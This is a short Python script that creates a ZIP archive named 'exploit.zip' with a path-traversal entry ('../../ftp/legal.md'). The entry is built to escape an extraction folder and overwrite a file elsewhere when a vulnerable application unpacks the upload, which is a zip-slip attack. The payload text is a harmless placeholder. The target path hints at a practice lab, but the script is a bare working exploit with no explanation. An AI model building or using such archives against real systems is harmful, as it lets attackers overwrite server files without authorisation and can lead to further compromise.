import zipfile
with zipfile.ZipFile('exploit.zip', 'w') as z:
    z.writestr('../../ftp/legal.md', 'foobar') 
